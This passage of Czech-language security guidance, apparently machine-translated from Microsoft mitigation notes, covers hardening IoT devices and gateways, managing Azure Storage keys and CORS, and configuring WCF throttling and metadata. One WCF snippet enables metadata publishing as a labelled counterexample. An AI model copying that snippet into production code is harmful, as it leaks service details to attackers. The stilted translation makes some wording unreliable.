| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Zařízení IoT | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | Jádro IoT Windows 10 implementuje odlehčenou verzi šifrování zařízení bit schránku, což má silné závislost na přítomnost čipu TPM na platformě, včetně potřeby preOS protokolu v rozhraní UEFI, který provádí nezbytné měření. Těchto měření preOS zajistěte, aby operační systém později spolehlivý záznam o tom, jak byl spuštěn operačním systémem. Šifrování oddíly operačního systému pomocí bit schránku a všechny další oddíly, také v případě, že budou ukládat všechny citlivá data. |

## <a id="min-enable"></a>Ujistěte se, že jsou povoleny pouze minimální služby nebo funkce v zařízení

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Zařízení IoT | 
| **SDL fáze**               | Nasazení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | Zapnout nebo vypnout všechny funkce a služby v operačním systému, který není nutný pro fungování řešení. Pro například pokud zařízení nevyžaduje uživatelského rozhraní mají být nasazeny, instalace jádro IoT Windows v režimu bez periferních zařízení. |

## <a id="field-bit-locker"></a>Šifrování operačního systému a další oddíly brána pole IoT se bit schránku

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Brána pole IoT | 
| **SDL fáze**               | Nasazení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | Jádro IoT Windows 10 implementuje odlehčenou verzi šifrování zařízení bit schránku, což má silné závislost na přítomnost čipu TPM na platformě, včetně potřeby preOS protokolu v rozhraní UEFI, který provádí nezbytné měření. Těchto měření preOS zajistěte, aby operační systém později spolehlivý záznam o tom, jak byl spuštěn operačním systémem. Šifrování oddíly operačního systému pomocí bit schránku a všechny další oddíly, také v případě, že budou ukládat všechny citlivá data. |

## <a id="default-change"></a>Ujistěte se, že jsou přihlašovací údaje výchozí brány pole změnit během instalace

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Brána pole IoT | 
| **SDL fáze**               | Nasazení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | Ujistěte se, že jsou přihlašovací údaje výchozí brány pole změnit během instalace |

## <a id="cloud-firmware"></a>Ujistěte se, že Cloudová brána implementuje proces aktuálnost firmware připojená zařízení

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Brána IoT cloudu | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Obecné |
| **Atributy**              | Volba brány - Azure IoT Hub |
| **Odkazy**              | [Přehled správy zařízení IoT Hub](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [k aktualizaci firmwaru zařízení](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
| **Kroky** | LWM2M je protokol z Open Mobile Alliance pro správu zařízení IoT. Správa zařízení Azure IoT umožňuje pracovat s fyzického zařízení pomocí úlohy zařízení. Ujistěte se, že Cloudová brána implementuje proces pravidelně udržovat zařízení a další konfigurační data do data pomocí Azure IoT Hub zařízení Management. |

## <a id="controls-policies"></a>Zajistěte, aby zařízení kontrolních mechanismů pro zabezpečení koncový bod nakonfigurovaný podle zásady organizace

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Počítač hranice vztahů důvěryhodnosti | 
| **SDL fáze**               | Nasazení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | Zkontrolujte, zda zařízení mít ovládací prvky zabezpečení koncový bod například bit schránku pro šifrování na úrovni disku, se aktualizované podpisy antivirové, hostitele na základě brány firewall, upgrady operačního systému, skupiny zásad atd., jsou nakonfigurované podle zásad zabezpečení organizace. |

## <a id="secure-keys"></a>Zajištění zabezpečení správy přístupových klíčů k úložišti Azure

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Azure Storage | 
| **SDL fáze**               | Nasazení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Příručka zabezpečení Azure Storage – Správa vaše klíče účtu úložiště](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Kroky** | <p>Úložiště klíčů: Doporučujeme k uložení přístupové klíče k úložišti Azure v Azure Key Vault jako tajný klíč a mít aplikace načíst klíč z trezoru klíčů. Tato možnost se doporučuje z následujících důvodů:</p><ul><li>Aplikace bude mít nikdy klíče pevně zakódované úložiště v konfiguračním souboru, který odebere tento způsob někdo získání přístupu ke klíčům bez konkrétní oprávnění</li><li>Přístup ke klíčům se dá řídit pomocí Azure Active Directory. To znamená, že účet vlastníka můžete udělit přístup k několik aplikací, které potřebují k načtení klíčů z Azure Key Vault. Jiné aplikace nebudou mít přístup k klíče bez udělení je konkrétně oprávnění</li><li>Opětovné generování klíče: Doporučujeme mít postup zavedené opětovné vygenerování přístupových klíčů úložiště Azure z bezpečnostních důvodů. Podrobnosti o důvod, proč a jak naplánovat opětovné generování klíče jsou popsané v článku referenční příručka zabezpečení úložiště Azure</li></ul>|

## <a id="cors-storage"></a>Zajistit, že pouze důvěryhodného zdroje jsou povolené, pokud je povoleno CORS na úložiště Azure

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Azure Storage | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Podpora CORS pro služby Azure Storage](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Kroky** | Úložiště Azure umožňuje povolit CORS – křížové sdílení prostředků původu. Pro každý účet úložiště můžete zadat domén, které mají přístup k prostředkům v daném účtu úložiště. Ve výchozím nastavení je CORS na všechny služby zakázána. CORS můžete povolit pomocí rozhraní REST API nebo knihovny klienta úložiště pro volání jedné z metod k nastavení zásad služby. |

## <a id="throttling"></a>Povolení služby WCF na funkci omezení

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | WCF | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Rozhraní .NET framework 3 |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [obohacení království](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Kroky** | <p>Není umístění omezení na využití systémových prostředků může mít za následek vyčerpání prostředků a nakonec i odepření služby.</p><ul><li>**Vysvětlení:** Windows Communication Foundation (WCF) nabízí možnost omezení žádosti o služby. Povolení příliš mnoho požadavků klienta můžete vyplnění systému a vyčerpat její prostředky. Na druhé straně povolení pouze malý počet žádosti o služby může zabránit oprávněných uživatelů pomocí služby. Každé služby by měl být jednotlivě přizpůsobená pro a nakonfigurovat tak, aby příslušné objem prostředků.</li><li>**DOPORUČENÍ** povolit WCF omezení funkce služby a nastavení omezení vhodné pro vaši aplikaci.</li></ul>|

### <a name="example"></a>Příklad:
Toto je příklad konfigurace s povoleno omezení:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>Zpřístupnění informací WCF prostřednictvím metadat

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | WCF | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Rozhraní .NET framework 3 |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [obohacení království](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Kroky** | Metadata může pomoci útočníci Další informace o systému a plánování forma útoku. Služby WCF můžete nakonfigurovat ke zveřejnění metadat. Metadata poskytuje informace o popis podrobné služby a nesmí být všesměrového vysílání v produkčním prostředí. `HttpGetEnabled`  /  `HttpsGetEnabled` Vlastností třídy ServiceMetaData definuje, zda služba bude vystavovat metadata | 

### <a name="example"></a>Příklad:
Následující kód dá pokyn k vysílání metadata služby WCF
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Není všesměrového vysílání metadata služby v produkčním prostředí. Nastavte HttpGetEnabled / HttpsGetEnabled vlastnosti ServiceMetaData tříd na hodnotu false. 

### <a name="example"></a>Příklad:
Následující kód dá pokyn k vysílání není metadata služby WCF. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
